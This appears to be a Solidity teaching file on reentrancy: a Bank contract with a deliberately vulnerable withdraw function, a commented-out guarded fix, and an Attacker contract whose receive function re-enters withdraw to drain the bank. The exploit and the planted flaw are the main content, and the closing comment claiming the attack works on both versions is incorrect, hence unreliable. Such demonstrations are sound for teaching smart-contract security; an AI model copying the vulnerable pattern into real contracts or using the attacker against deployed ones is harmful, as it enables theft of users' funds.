// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract Bank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    // ===== VULNERABLE: external call BEFORE state update =====
    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No balance");
        (bool ok, ) = msg.sender.call{value: bal}("");
        require(ok, "Transfer failed");
        balances[msg.sender] = 0;
    }

    // ===== FIXED: uncomment this block and comment out the vulnerable withdraw above =====
    // bool private locked;
    // modifier nonReentrant() {
    //     require(!locked, "Reentrant call");
    //     locked = true;
    //     _;
    //     locked = false;
    // }
    // function withdraw() public nonReentrant {
    //     uint256 bal = balances[msg.sender];
    //     require(bal > 0, "No balance");
    //     balances[msg.sender] = 0;                       // effects first
    //     (bool ok, ) = msg.sender.call{value: bal}("");  // interaction last
    //     require(ok, "Transfer failed");
    // }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

// Exploit contract (no changes needed, works on both versions)
contract Attacker {
    Bank public bank;
    address public owner;

    constructor(address _bank) {
        bank = Bank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Send 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}